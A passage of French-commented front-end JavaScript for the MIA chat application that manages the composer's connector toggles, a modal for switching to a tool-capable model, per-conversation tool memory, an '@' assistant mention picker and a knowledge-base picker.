        foldBody.hidden = !unfold;
        foldBtn.setAttribute('aria-expanded', unfold ? 'true' : 'false');
    };
    // Volet déplié : on fait défiler LE PANNEAU (jamais scrollIntoView, qui
    // ferait aussi défiler la rangée d'actions du composer, sur téléphone)
    // pour que le bas du volet soit visible. Pixels d'écran ramenés à la
    // taille d'affichage (miaUiZoom).
    const revealFold = () => {
        if (!foldBody || foldBody.hidden) return;
        const over = foldBody.getBoundingClientRect().bottom - panel.getBoundingClientRect().bottom;
        if (over > 0) panel.scrollTop += over / (window.miaUiZoom?.() || 1) + 4;
    };
    setFold(false);
    // Ménage : la version 1.5.1.13 retenait l'état du volet par appareil.
    try { localStorage.removeItem('plusMenuFold:' + (window.CURRENT_USER_ID ?? 'anon')); } catch { /* rien à nettoyer */ }
    foldBtn?.addEventListener('click', () => {
        setFold(foldBody.hidden);
        revealFold();
    });

    function syncConnectorSummary() {
        if (!foldBody) { if (connChip) connChip.hidden = true; return; }
        const rows   = Array.from(foldBody.querySelectorAll('.plus-menu-row[data-connector]'))
            .filter(r => r.dataset.disabled !== '1' && r.dataset.connector !== 'auto');
        const on     = rows.filter(r => r.querySelector('input[type="checkbox"]')?.checked);
        const autoOn = !!autoToggle?.checked;
        if (foldCount) {
            foldCount.textContent = rows.length === 0 ? ''
                : on.length > 0 ? t('{n} sur {total}', { n: on.length, total: rows.length })
                : window.tn(rows.length, '{n} relié', '{n} reliés');
        }
        // Logos : ceux des lignes, recopiés (une seule source d'image) ;
        // l'étincelle de « Laisser MIA choisir » en tête quand il est allumé.
        const pieces = [];
        if (autoOn) {
            const spark = document.querySelector('#plusMenuAutoRow .plus-menu-icon svg');
            if (spark) pieces.push(spark.cloneNode(true));
        }
        on.slice(0, MAX_SUMMARY_LOGOS).forEach(r => {
            const img = r.querySelector('.plus-menu-icon img');
            if (img) { const copie = img.cloneNode(true); copie.alt = ''; pieces.push(copie); }
        });
        const extra = on.length - MAX_SUMMARY_LOGOS;
        if (foldLogos) {
            foldLogos.replaceChildren(...pieces.map(p => {
                const tuile = document.createElement('span');
                tuile.appendChild(p.cloneNode(true));
                return tuile;
            }));
            if (extra > 0) {
                const plus = document.createElement('span');
                plus.className = 'plus-menu-fold-more';
                plus.textContent = '+' + extra;
                foldLogos.appendChild(plus);
            }
        }
        if (!connChip) return;
        connChip.hidden = pieces.length === 0;
        connChip.replaceChildren(...pieces);
        if (extra > 0) {
            const plus = document.createElement('span');
            plus.className = 'composer-connectors-more';
            plus.textContent = '+' + extra;
            connChip.append(plus);
        }
        // Téléphone (main.css) : jusqu'à 768 px la puce ne garde que son
        // premier logo et compte les autres ; sous 480 px elle cède la place à
        // un compte sur le « + ». Jamais elle ne pousse les boutons assistants
        // et bases hors de la rangée.
        const others = pieces.length - 1 + Math.max(extra, 0);
        if (others > 0) connChip.dataset.more = '+' + others;
        else delete connChip.dataset.more;
        if (pieces.length > 0) btn.dataset.count = String(pieces.length + Math.max(extra, 0));
        else delete btn.dataset.count;
        const noms = on.map(r => r.dataset.service || r.dataset.label || '');
        if (autoOn) noms.unshift(t('Laisser MIA choisir'));
        const libelle = t('Connecteurs allumés : {liste}', { liste: noms.join(', ') });
        connChip.title = libelle;
        connChip.setAttribute('aria-label', libelle + ' — ' + t('ouvrir les connecteurs'));
    }
    connChip?.addEventListener('click', e => {
        // Hors de #plusMenu : sans stopPropagation, l'écouteur de fermeture
        // du document refermerait aussitôt le menu ouvert ici.
        e.stopPropagation();
        window.closeComposerPopovers('plus');
        setFold(true);
        open();
        revealFold();
    });

    // ---- Connecteurs : toujours visibles, bascule de modèle validée ----
    // Une ligne de connecteur n'est rendue que si l'admin a configuré la
    // source (sinon absente du DOM). Elle reste TOUJOURS activable, même si le
    // modèle courant ne sait pas piloter le function-calling : dans ce cas
    // l'activation ouvre une modale qui propose les modèles compatibles, et
    // c'est l'utilisateur qui valide la bascule. Refuser est un choix valide
    // (le connecteur reste éteint, le modèle inchangé).
    const connectorRows = [
        { name: 'drive',    row: document.getElementById('plusMenuDriveRow'),    toggle: driveToggle },
        { name: 'gmail',    row: document.getElementById('plusMenuGmailRow'),    toggle: gmailToggle },
        { name: 'calendar', row: document.getElementById('plusMenuCalendarRow'), toggle: calendarToggle },
        { name: 'tasks',    row: document.getElementById('plusMenuTasksRow'),    toggle: tasksToggle },
        { name: 'outlook',  row: document.getElementById('plusMenuOutlookRow'),  toggle: outlookToggle },
        { name: 'mscalendar', row: document.getElementById('plusMenuMsCalendarRow'), toggle: msCalendarToggle },
        { name: 'mstodo',   row: document.getElementById('plusMenuMsTodoRow'),    toggle: msTodoToggle },
        { name: 'teams',    row: document.getElementById('plusMenuTeamsRow'),     toggle: teamsToggle },
        { name: 'slack',    row: document.getElementById('plusMenuSlackRow'),     toggle: slackToggle },
        { name: 'auto',     row: document.getElementById('plusMenuAutoRow'),      toggle: autoToggle },
    ].filter(c => c.row && c.toggle);
    connectorRows.forEach(c => {
        c.row.dataset.baseTitle = c.row.title;
        c.row.dataset.baseHint  = c.row.querySelector('.plus-menu-hint')?.textContent || '';
    });

    const modelSupportsTools = () => !!window.LLM_INFO?.[llmSelect?.value]?.tool_use;
    // Modèles à la fois autorisés pour ce compte (la liste du picker est déjà
    // filtrée par groupe) et capables de piloter les connecteurs.
    const connectorCapableLlms = () =>
        Array.from(document.querySelectorAll('#llmPickerList .llm-picker-item[data-value]'))
            .filter(i => !!window.LLM_INFO?.[i.dataset.value]?.tool_use);

    const llmModal       = document.getElementById('connectorLlmModal');
    const llmModalMsg    = document.getElementById('connectorLlmMsg');
    const llmModalList   = document.getElementById('connectorLlmList');
    const llmModalOk     = document.getElementById('connectorLlmConfirm');
    const llmModalCancel = document.getElementById('connectorLlmCancel');
    let pendingConnector = null;  // toggle à allumer une fois le modèle basculé
    let pickedLlm        = '';

    const closeLlmModal = () => {
        if (llmModal) llmModal.style.display = 'none';
        pendingConnector = null;
        pickedLlm = '';
    };

    function openConnectorLlmModal(toggle, label) {
        if (!llmModal) return;
        // Le clic vient d'une ligne du menu « + » : le listener global de
        // fermeture ne se déclenche pas (cible interne à #plusMenu). Sans ça
        // le panneau resterait ouvert PAR-DESSUS la modale.
        close();
        pendingConnector = toggle;
        pickedLlm = '';
        llmModalList.innerHTML = '';
        llmModalOk.disabled = true;
        const currentLabel = window.LLM_INFO?.[llmSelect?.value]?.label || t('Le modèle actuel');
        // Conversation portée par un assistant : le modèle est imposé, aucune
        // bascule n'est possible depuis le chat.
        const options = window.PROFILE_LOCKED_LLM ? [] : connectorCapableLlms();

        if (window.PROFILE_LOCKED_LLM) {
            llmModalMsg.textContent = t('« {outil} » a besoin d\'un modèle capable de piloter les connecteurs. ', { outil: label })
                + t('Cette conversation utilise un assistant dont le modèle ({modele}) est imposé et ne sait pas le faire. ', { modele: currentLabel })
                + t("Ouvrez une conversation sans assistant, ou demandez à un administrateur de changer le modèle de l'assistant.");
        } else if (options.length === 0) {
            llmModalMsg.textContent = t('« {outil} » a besoin d\'un modèle capable de piloter les connecteurs, ', { outil: label })
                + t('et aucun modèle disponible pour votre compte ne sait le faire. Contactez un administrateur.');
        } else {
            llmModalMsg.textContent = t('{modele} ne sait pas piloter les connecteurs. ', { modele: currentLabel })
                + t('Choisissez un modèle compatible pour activer « {outil} » — il sera utilisé pour la suite de la conversation.', { outil: label });
            options.forEach(src => {
                const li = document.createElement('li');
                li.className = 'llm-picker-item modal-llm-item';
                li.dataset.value = src.dataset.value;
                const img = document.createElement('img');
                img.className = 'llm-icon';
                img.src = src.dataset.logo || '';
                img.alt = '';
                const span = document.createElement('span');
                span.className = 'llm-picker-item-label';
                span.textContent = src.dataset.label || src.dataset.value;
                li.append(img, span);
                li.addEventListener('click', () => {
                    llmModalList.querySelectorAll('.modal-llm-item').forEach(i => i.classList.remove('active'));
                    li.classList.add('active');
                    pickedLlm = li.dataset.value;
                    llmModalOk.disabled = false;
                });
                llmModalList.appendChild(li);
            });
        }
        const hasChoice = options.length > 0;
        llmModalList.hidden = !hasChoice;
        llmModalOk.hidden   = !hasChoice;
        llmModalCancel.textContent = hasChoice ? t('Garder ce modèle') : t('Fermer');
        llmModal.style.display = 'flex';
    }

    llmModalOk?.addEventListener('click', () => {
        const toggle = pendingConnector;
        const value  = pickedLlm;
        closeLlmModal();
        if (!toggle || !value || !window.applyLlmChoice?.(value)) return;
        // Modèle compatible : le connecteur demandé s'allume pour de bon.
        if (!toggle.checked) {
            toggle.checked = true;
            toggle.dispatchEvent(new Event('change'));
        }
    });
    llmModalCancel?.addEventListener('click', closeLlmModal);
    llmModal?.addEventListener('click', e => { if (e.target === llmModal) closeLlmModal(); });
    document.addEventListener('keydown', e => {
        if (e.key === 'Escape' && llmModal?.style.display === 'flex') closeLlmModal();
    });

    // Garde d'activation — enregistrée AVANT les listeners d'indicateurs et de
    // persistance : le connecteur est remis à zéro dans le même évènement, donc
    // ni le point ambre ni le préréglage ne voient un état allumé illusoire.
    connectorRows.forEach(c => {
        c.toggle.addEventListener('change', () => {
            if (!c.toggle.checked || modelSupportsTools()) return;
            // Restauration automatique d'un préréglage (persistPaused) : refus
            // silencieux, le connecteur reviendra sur un modèle compatible.
            const silent = persistPaused;
            c.toggle.checked = false;
            if (!silent) openConnectorLlmModal(c.toggle, c.row.dataset.label || t('Ce connecteur'));
        });
    });

    webToggle?.addEventListener('change', syncOptionIndicators);
    driveToggle?.addEventListener('change', syncOptionIndicators);
    gmailToggle?.addEventListener('change', syncOptionIndicators);
    calendarToggle?.addEventListener('change', syncOptionIndicators);
    tasksToggle?.addEventListener('change', syncOptionIndicators);
    [outlookToggle, msCalendarToggle, msTodoToggle, teamsToggle, slackToggle, autoToggle].forEach(b => b?.addEventListener('change', syncOptionIndicators));
    Object.values(connectorToggles).forEach(bascule => bascule?.addEventListener('change', saveConnectorPrefs));
    Object.keys(connectorToggles).forEach(restoreConnectorToggle);
    syncOptionIndicators();
    // Clic sur la ligne entière = toggle (confort), le switch gère son propre clic
    document.getElementById('plusMenuWebRow')?.addEventListener('click', e => {
        if (e.target.closest('.ios-switch') || !webToggle) return;
        webToggle.checked = !webToggle.checked;
        webToggle.dispatchEvent(new Event('change'));
    });
    // Connecteur non connecté (data-reason="connect") : la ligne mène aux
    // Réglages → Comptes connectés — droit sur la carte du service quand la
    // connexion a EXPIRÉ (data-reason="reconnect", ancre = clé du connecteur).
    // Sinon clic sur la ligne = bascule du switch.
    connectorRows.forEach(c => {
        c.row.addEventListener('click', e => {
            if (c.row.dataset.disabled === '1') {
                const reason = c.row.dataset.reason;
                if (reason === 'connect')   window.location.href = '/settings/connections';
                if (reason === 'reconnect') window.location.href = '/settings/connections#connector-' + c.name;
                return;
            }
            if (e.target.closest('.ios-switch')) return;
            c.toggle.checked = !c.toggle.checked;
            c.toggle.dispatchEvent(new Event('change'));
        });
    });

    // Modèle courant sans function-calling : la ligne reste visible et
    // cliquable (l'activer ouvre la modale de bascule), seul le libellé
    // prévient. Un connecteur déjà allumé au moment où l'utilisateur choisit un
    // modèle incompatible est éteint — le serveur l'ignorerait de toute façon —
    // sans perdre le préréglage, rétabli au retour sur un modèle compatible.
    const MODEL_BLOCKED_HINT  = t('Nécessite un modèle compatible');
    const MODEL_BLOCKED_TITLE = window.PROFILE_LOCKED_LLM
        ? t('Le modèle imposé par cet assistant ne sait pas piloter les connecteurs')
        : t('Ce modèle ne sait pas piloter les connecteurs — cliquer pour choisir un modèle compatible');
    window.syncConnectorCompat = function () {
        const toolOk = modelSupportsTools();
        connectorRows.forEach(c => {
            const notConnected = c.row.dataset.disabled === '1';
            const blocked      = !toolOk && !notConnected;
            c.row.title = blocked ? MODEL_BLOCKED_TITLE : c.row.dataset.baseTitle;
            // Description masquée dans le menu, SAUF quand elle est une
            // information : ici, le modèle ne sait pas piloter les connecteurs.
            c.row.classList.toggle('is-blocked', blocked);
            const hint = c.row.querySelector('.plus-menu-hint');
            if (hint) hint.textContent = blocked ? MODEL_BLOCKED_HINT : c.row.dataset.baseHint;
            if (notConnected) return;
            if (!toolOk && c.toggle.checked) {
                persistPaused = true;
                c.toggle.checked = false;
                c.toggle.dispatchEvent(new Event('change'));
                persistPaused = false;
            } else if (toolOk && !c.toggle.checked) {
                restoreConnectorToggle(c.name);
            }
        });
        syncOptionIndicators();
    };
    window.syncConnectorCompat();

    // Chip d'outil actif : témoin amovible dans la barre, menu fermé
    const chip = document.getElementById('toolChip');
    const clearSelectedStyles = () =>
        panel.querySelectorAll('.tool-picker-item.is-selected').forEach(i => {
            i.classList.remove('is-selected');
            i.setAttribute('aria-checked', 'false'); // role="menuitemradio" : l'état doit suivre
        });
    function setToolChip(tool) {
        if (!chip) return;
        if (!tool) { chip.hidden = true; return; }
        document.getElementById('toolChipName').textContent = tool.name;
        chip.hidden = false;
    }
    document.getElementById('toolChipRemove')?.addEventListener('click', () => {
        // Croix de la pastille = l'utilisateur éteint l'outil : le choix
        // mémorisé pour cette conversation disparaît avec lui.
        applySelectedTool(null);
    });

    // ---- Mémoire de l'outil actif, PAR CONVERSATION ----
    // Un outil engagé — clic du picker OU suggestion acceptée, c'est le même
    // état — le reste pour toute la conversation : messages suivants,
    // rechargement de page, aller-retour entre conversations. Il ne s'éteint
    // que sur un geste explicite (re-clic dans le menu, croix de la pastille).
    // Règle identique pour TOUS les types d'outils : on affine une image, un
    // site, un itinéraire ou une vidéo de la même façon.
    // Même patron que les préréglages de connecteurs : clé par utilisateur
    // (navigateur partagé = pas de fuite entre comptes), écriture best-effort.
    const TOOL_PREFS_KEY = 'toolPrefs:' + (window.CURRENT_USER_ID ?? 'anon');
    const MAX_TOOL_PREFS = 50;   // borne du stockage : conversations les plus récentes
    const DRAFT_KEY      = 'draft'; // message tapé avant la création de la conversation

    const convKey = () => String(convId() || '') || DRAFT_KEY;
    const readToolPrefs = () => {
        try { return JSON.parse(localStorage.getItem(TOOL_PREFS_KEY) || '{}') || {}; }
        catch { return {}; }
    };
    const writeToolPrefs = (prefs) => {
        try { localStorage.setItem(TOOL_PREFS_KEY, JSON.stringify(prefs)); }
        catch { /* quota plein ou navigation privée : pas de persistance, tant pis */ }
    };
    function rememberTool(tool) {
        const prefs = readToolPrefs();
        const key   = convKey();
        if (tool) prefs[key] = { id: tool.id, type: tool.type, ts: Date.now() };
        else delete prefs[key];
        // Purge des conversations les plus anciennes : sans borne, le stockage
        // grossirait indéfiniment au fil des conversations.
        const keys = Object.keys(prefs).sort((a, b) => (prefs[a]?.ts || 0) - (prefs[b]?.ts || 0));
        while (keys.length > MAX_TOOL_PREFS) delete prefs[keys.shift()];
        writeToolPrefs(prefs);
    }

    // Un item du menu → l'objet outil consommé par submitForm. Le provider et
    // le modèle ne vivent que dans window.VIDEO_TOOLS (promptVideoSettings les
    // exige), d'où la jointure ici et non dans le DOM.
    function toolFromItem(item) {
        const type = item.dataset.type;
        const toolDef = type === 'video' ? videoToolsMap.get(String(item.dataset.id)) : null;
        return {
            id: item.dataset.id,
            type,
            name: item.dataset.name,
            provider: toolDef?.provider || '',
            model: toolDef?.model || '',
        };
    }
    // Premier item disponible parmi `types` ; `preferId` = outil exact voulu.
    function findToolItem(types, preferId = null) {
        let item = preferId
            ? panel.querySelector(`.tool-picker-item[data-id="${preferId}"]:not([data-disabled="1"])`)
            : null;
        if (item && !(types || []).includes(item.dataset.type)) item = null;
        if (item) return item;
        for (const t of (types || [])) {
            item = panel.querySelector(`.tool-picker-item[data-type="${t}"]:not([data-disabled="1"])`);
            if (item) return item;
        }
        return null;
    }

    // SOURCE UNIQUE de l'état « outil actif » : variable, surlignage du menu,
    // pastille et mémoire. `persist = false` pour une restauration — elle
    // rejoue une intention passée, elle n'en exprime aucune (même raisonnement
    // que persistPaused côté connecteurs).
    function applySelectedTool(tool, persist = true) {
        selectedTool = tool;
        clearSelectedStyles();
        if (tool) {
            const item = panel.querySelector(`.tool-picker-item[data-id="${tool.id}"]`);
            item?.classList.add('is-selected');
            item?.setAttribute('aria-checked', 'true');
        }
        setToolChip(tool);
        if (persist) rememberTool(tool);
    }

    // Arme un outil comme un clic du picker (suggestion acceptée, mode
    // itération d'une page HTML). Un outil déjà engagé n'est JAMAIS écrasé :
    // le choix en cours prime sur toute proposition automatique.
    window.armToolFromPicker = function (types, preferId = null) {
        if (selectedTool) return false;
        const item = findToolItem(types, preferId);
        if (!item) return false;
        applySelectedTool(toolFromItem(item));
        return true;
    };

    // Rejoue le choix mémorisé pour la conversation affichée. Faux si rien
    // n'est mémorisé ou si l'outil n'est plus disponible (retiré par un
    // administrateur, dernier test en échec) — on n'arme alors rien plutôt que
    // d'envoyer le prochain message vers un outil mort.
    window.restoreToolForConversation = function () {
        const pref = readToolPrefs()[convKey()];
        if (!pref) return false;
        // L'outil EXACT, jamais un remplaçant du même type : basculer en
        // silence sur un autre générateur ne serait pas le choix mémorisé.
        const item = panel.querySelector(`.tool-picker-item[data-id="${pref.id}"]:not([data-disabled="1"])`);
        if (!item || item.dataset.type !== pref.type) return false;
        applySelectedTool(toolFromItem(item), false);
        return true;
    };
    // Aucun choix mémorisé pour la conversation affichée : la pastille de la
    // conversation précédente doit disparaître, sans rien effacer en mémoire.
    window.clearSelectedTool = function () {
        if (selectedTool) applySelectedTool(null, false);
    };
    // La conversation vient d'être créée : le choix fait sur le brouillon la
    // suit (sinon l'outil serait perdu au premier message d'une conversation).
    window.carryToolChoiceToConversation = function () {
        const prefs = readToolPrefs();
        if (prefs[DRAFT_KEY]) {
            delete prefs[DRAFT_KEY];
            writeToolPrefs(prefs);
        }
        if (selectedTool) rememberTool(selectedTool);
    };

    // Sélection d'un outil (re-clic sur l'outil actif = désélection)
    panel.querySelectorAll('.tool-picker-item').forEach(item => {
        bindActivate(item, () => {
            if (item.dataset.disabled === '1') return;
            const wasSelected = item.classList.contains('is-selected');
            applySelectedTool(wasSelected || !item.dataset.id ? null : toolFromItem(item));
            close();
        });
    });

    // Conversation affichée au chargement de la page (rendu serveur).
    syncToolForConversation();
})();

// ---- Sélecteur d'assistants (icône personnes sous la pilule) ----
(function () {
    const btn  = document.getElementById('assistantPickerBtn');
    const list = document.getElementById('assistantPickerList');
    if (!btn || !list) return;

    const items   = Array.from(list.querySelectorAll('.assistant-picker-item'));
    const header  = document.getElementById('assistantPickerHeader');
    const empty   = document.getElementById('assistantPickerEmpty');
    const labels  = Array.from(list.querySelectorAll('.picker-section-label')).filter(l => l !== header);
    const HEADER_DEFAULT = header?.textContent || t('Démarrer avec un assistant');

    // ---- Mention « @ » dans le composer ----
    // La liste du bouton robot EST la liste de la mention : mêmes lignes,
    // donc même périmètre d'accès (assistants du groupe, personnels, globaux)
    // sans second rendu à tenir à jour. On ne fait que filtrer et surligner.
    // `mention` = null hors mode mention, sinon les bornes du jeton `@…` dans
    // le textarea (pour le retirer à la validation).
    let mention = null;

    const close = () => {
        list.style.display = 'none';
        btn.setAttribute('aria-expanded', 'false');
        if (mention) resetFilter();
        mention = null;
    };

    // Accents et casse ignorés : « @mia », « @MIA », « @mîa » se valent.
    const norm = (s) => (s || '')
        .toLowerCase()
        .normalize('NFD')
        .replace(/[̀-ͯ]/g, '');

    // Un assistant sort si la requête préfixe son nom OU un de ses mots
    // (« @mode » trouve « MIA : mode d'emploi »), à défaut si elle y apparaît.
    const matches = (name, query) => {
        const q = norm(query);
        if (q === '') return true;
        const n = norm(name);
        return n.startsWith(q)
            || n.split(/[^a-z0-9]+/).some(w => w !== '' && w.startsWith(q))
            || n.includes(q);
    };

    const resetFilter = () => {
        items.forEach(i => { i.hidden = false; i.classList.remove('is-active'); });
        labels.forEach(l => { l.hidden = false; });
        if (empty)  empty.hidden = true;
        if (header) { header.textContent = HEADER_DEFAULT; header.hidden = false; }
    };

    // Un libellé de section sans aucune ligne visible en dessous n'a plus
    // lieu d'être : sinon « Mes assistants personnels » surmonte le vide.
    const syncSectionLabels = () => {
        labels.forEach(label => {
            let visible = false;
            for (let el = label.nextElementSibling; el; el = el.nextElementSibling) {
                if (el.classList.contains('picker-section-label')) break;
                if (el.classList.contains('assistant-picker-item') && !el.hidden) { visible = true; break; }
            }
            label.hidden = !visible;
        });
    };

    const visibleItems = () => items.filter(i => !i.hidden);

    const setActive = (item) => {
        items.forEach(i => i.classList.toggle('is-active', i === item));
        item?.scrollIntoView({ block: 'nearest' });
    };

    const moveActive = (delta) => {
        const shown = visibleItems();
        if (shown.length === 0) return;
        const cur = shown.indexOf(list.querySelector('.assistant-picker-item.is-active'));
        setActive(shown[(cur + delta + shown.length) % shown.length]);
    };

    // Jeton `@…` sous le curseur. Exigences : le `@` ouvre un mot (début de
    // message ou espace avant) — sinon une adresse email ouvrirait la liste —
    // et le curseur est bien à la fin du jeton, pas en pleine relecture.
    const mentionToken = () => {
        if (!msgInput || document.activeElement !== msgInput) return null;
        const pos = msgInput.selectionStart ?? 0;
        if (pos !== (msgInput.selectionEnd ?? pos)) return null;
        const m = msgInput.value.slice(0, pos).match(/(?:^|\s)@([^\s@]{0,40})$/);
        return m ? { query: m[1], start: pos - m[1].length - 1, end: pos } : null;
    };

    const openMention = (token) => {
        mention = token;
        items.forEach(i => { i.hidden = !matches(i.dataset.name || '', token.query); });
        syncSectionLabels();
        const shown = visibleItems();
        if (empty)  empty.hidden = shown.length > 0;
        if (header) header.textContent = shown.length > 0
            ? t('Basculer vers un assistant')
            : HEADER_DEFAULT;
        // Seuls des workflows répondent : leur section se suffit (pas
        // d'en-tête « Basculer vers un assistant » au-dessus de rien).
        if (header) header.hidden = shown.length > 0 && shown.every(i => i.dataset.workflowId);
        setActive(shown[0] || null);
        window.closeComposerPopovers('assistant');
        list.style.display = '';
        window.fitComposerPopover(list);
        btn.setAttribute('aria-expanded', 'true');
    };

    const syncMention = () => {
        const token = mentionToken();
        if (token) { openMention(token); return; }
        if (mention) close();
    };

    // Validation : le `@nom` est une commande de navigation, pas du contenu —
    // on le retire du texte AVANT `startWithAssistant`, qui met le reste du
    // brouillon de côté et le restaure dans la nouvelle conversation.
    const applyMention = (item) => {
        if (mention && msgInput) {
            const v = msgInput.value;
            msgInput.value = v.slice(0, mention.start) + v.slice(mention.end).replace(/^[ \t]+/, '');
            const caret = mention.start;
            msgInput.setSelectionRange(caret, caret);
            // Redimensionnement du textarea et état du bouton Envoyer : on
            // laisse les listeners existants faire, pas de logique en double.
            msgInput.dispatchEvent(new Event('input', { bubbles: true }));
        }
        close();
        if (item.dataset.workflowId) { launchWorkflowFromChat(item.dataset.workflowId); return; }
        if (item.dataset.id) startWithAssistant(item.dataset.id);
    };

    if (msgInput) {
        msgInput.addEventListener('input', syncMention);
        msgInput.addEventListener('click', syncMention);
        msgInput.addEventListener('keyup', e => {
            if (['ArrowLeft', 'ArrowRight', 'Home', 'End'].includes(e.key)) syncMention();
        });
        // Volontairement pas de fermeture au `blur` : cliquer une ligne de la
        // liste fait perdre le focus au textarea AVANT le clic, et `mention`
        // serait déjà remis à null — le « @nom » ne serait pas retiré. La
        // fermeture est assurée par le clic hors du picker (plus bas).

        // Capture sur `document` : les touches de navigation doivent être
        // interceptées AVANT le listener d'envoi posé sur le textarea (sur le
        // nœud cible, capture et bulle partent dans l'ordre d'ajout — passer
        // par un ancêtre en capture est le seul moyen de passer devant).
        document.addEventListener('keydown', e => {
            if (!mention || e.target !== msgInput) return;
            if (e.key === 'Escape') {
                e.stopPropagation();
                e.preventDefault();
                close();
                return;
            }
            if (e.key === 'ArrowDown' || e.key === 'ArrowUp') {
                if (visibleItems().length === 0) return;
                e.stopPropagation();
                e.preventDefault();
                moveActive(e.key === 'ArrowDown' ? 1 : -1);
                return;
            }
            if (e.key === 'Enter' || e.key === 'Tab') {
                const active = list.querySelector('.assistant-picker-item.is-active:not([hidden])');
                // Aucune correspondance : on ne confisque pas la touche, le
                // message part normalement (« @truc » n'est alors que du texte).
                if (!active) return;
                e.stopPropagation();
                e.preventDefault();
                applyMention(active);
            }
        }, true);
    }

    btn.addEventListener('click', e => {
        e.stopPropagation();
        const willOpen = list.style.display === 'none';
        window.closeComposerPopovers('assistant');
        mention = null;
        resetFilter();
        list.style.display = willOpen ? '' : 'none';
        if (willOpen) window.fitComposerPopover(list);
        btn.setAttribute('aria-expanded', willOpen ? 'true' : 'false');
    });

    // Lance un workflow : sa fenêtre de lancement (workflows.js), avec les
    // fichiers joints dans la zone de saisie comme pièces de départ (dans
    // l'ordre des champs fichier) et le texte saisi dans le premier champ
    // texte. Le workflow écrit dans SA conversation : on y va une fois lancé.
    async function launchWorkflowFromChat(workflowId) {
        if (!window.MiaWorkflowLaunch || !await ensureSessionActive()) return;
        try {
            const res = await fetch('/workflows/' + encodeURIComponent(String(workflowId)) + '/form', { headers: { Accept: 'application/json' } });
            const j = await res.json();
            if (!j.ok) { showToast(j.error || t('Ce workflow ne peut pas être lancé.'), 'error'); return; }
            const form = j.form;
            const files = {};
            const values = {};
            const queue = pendingFiles.slice();
            (form.fields || []).forEach((f) => {
                if (f.type === 'file' && queue.length) {
                    const pf = queue.shift();
                    files[f.key] = { token: pf.token, name: pf.name };
                }
            });
            const text = (msgInput?.value || '').trim();
            const textField = (form.fields || []).find((f) => f.type === 'longtext' || f.type === 'text');
            if (text && textField) values[textField.key] = text;
            window.MiaWorkflowLaunch.openWithForm(form, {
                files, values, trigger: 'chat',
                onLaunched: (r) => {
                    clearFiles();
                    if (msgInput) { msgInput.value = ''; msgInput.dispatchEvent(new Event('input', { bubbles: true })); }
                    window.location.href = r.url;
                },
            });
        } catch (_) {
            showToast(t('Ce workflow ne peut pas être lancé.'), 'error');
        }
    }

    // Démarre une conversation avec l'assistant choisi. Le brouillon en cours
    // est conservé (sessionStorage) et restauré après le rechargement.
    async function startWithAssistant(profileId) {
        if (!await ensureSessionActive()) return;
        const draft = msgInput?.value || '';
        try {
            if (draft.trim() !== '') sessionStorage.setItem('composerDraft', draft);
        } catch (_) {}
        btn.disabled = true;
        const fd = new FormData();
        fd.append('llm', llmSelect?.value || '');
        fd.append('profile_id', String(profileId));
        // Même report que createConversation — ici il n'y a pas d'alternative :
        // la page est rechargée juste après, plus aucun JavaScript ne pourrait
        // reporter le choix.
        window.kbDraftAppend?.(fd);
        try {
            const res = await fetchWithSessionGuard('/chat/new', { method: 'POST', headers: { 'X-CSRF-Token': csrfToken }, body: fd, redirect: 'follow' });
            window.kbDraftClear?.();
            window.location.href = res.url || '/';
        } catch (err) {
            btn.disabled = false;
            if (err instanceof Error && err.message === 'SESSION_EXPIRED') return;
        }
    }

    items.forEach(item => {
        // En mode mention, le clic doit AUSSI retirer le « @nom » du texte :
        // même issue que la validation au clavier, un seul chemin.
        const go = () => {
            if (mention) { applyMention(item); return; }
            close();
            if (item.dataset.workflowId) { launchWorkflowFromChat(item.dataset.workflowId); return; }
            if (item.dataset.id) startWithAssistant(item.dataset.id);
        };
        item.addEventListener('click', go);
        item.addEventListener('keydown', e => {
            if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); go(); }
        });
    });

    document.addEventListener('click', e => {
        // Le composer est exclu : son propre listener vient de (ré)ouvrir la
        // mention sous le curseur, la refermer ici l'annulerait aussitôt.
        if (!e.target.closest('#assistantPicker') && e.target !== msgInput) close();
    });
})();

// ---- Sélecteur de bases de connaissances (composer) ----
// Les bases cochées S'AJOUTENT à celles de l'assistant et valent pour toute la
// conversation. La vérité vit CÔTÉ SERVEUR (table conversation_knowledge_bases,
// migration 069) : cet écran n'en est que le reflet, et ne bascule jamais avant
// le OK serveur — patron de togglePinConv.
(function () {
    const btn   = document.getElementById('kbPickerBtn');
    const panel = document.getElementById('kbPickerPanel');
    const list  = document.getElementById('kbPickerList');
    if (!btn || !panel || !list) return;   // aucune base : le bouton n'est pas rendu

    const count = document.getElementById('kbPickerCount');
    const hint  = document.getElementById('kbPickerHint');
    const CFG   = window.KB_PICKER || { max: 3, selected: [], profile: [] };
    const MAX   = Number(CFG.max) || 3;
    // Clé par COMPTE (navigateur partagé), comme toolPrefs/connectorPrefs. Une
    // simple liste d'ids : ce brouillon ne sert qu'à la conversation pas encore
    // créée, toute conversation réelle a sa vérité en base.
    const DRAFT_KEY = 'kbDraft:' + (window.CURRENT_USER_ID ?? 'anon');

    let selected  = (CFG.selected || []).map(Number);   // = dernier OK serveur
    let profileKb = CFG.profile  || [];
    let reqSeq    = 0;                                  // garde anti-réponse tardive

    // ---- Ouverture / fermeture ----
    const open  = () => { panel.hidden = false; window.fitComposerPopover(panel); btn.setAttribute('aria-expanded', 'true'); };
    const close = () => { panel.hidden = true;  btn.setAttribute('aria-expanded', 'false'); };
    window.closeKbPicker = close;

    btn.addEventListener('click', e => {
        e.stopPropagation();
        window.closeComposerPopovers('kb');
        panel.hidden ? open() : close();
    });
    document.addEventListener('click', e => { if (!e.target.closest('#kbPicker')) close(); });
    document.addEventListener('keydown', e => { if (e.key === 'Escape') close(); });
    // Largeur seulement : cf. le menu « + » (le clavier qui se ferme émet
    // `resize` sur Android).
    let lastWidth = window.innerWidth;
    window.addEventListener('resize', () => {
        if (window.innerWidth === lastWidth) return;
        lastWidth = window.innerWidth;
        close();
    });

    // ---- Brouillon (conversation pas encore créée) ----
    // null = aucun brouillon : c'est ce qui distingue « rien choisi encore »
    // (les bases cochées par défaut s'appliquent) de « tout décoché » (le
    // choix de l'utilisateur, respecté).
    const readDraftRaw = () => {
        let raw = null;
        try { raw = localStorage.getItem(DRAFT_KEY); }
        catch (_) { return null; }
        if (raw === null) return null;
        try { return (JSON.parse(raw) || []).map(Number); }
        catch (_) { return []; }
    };
    const readDraft = () => readDraftRaw() || [];
    const writeDraft = (ids) => {
        try { localStorage.setItem(DRAFT_KEY, JSON.stringify(ids)); }
        catch (_) {}
    };
    const clearDraft = () => {
        try { localStorage.removeItem(DRAFT_KEY); }
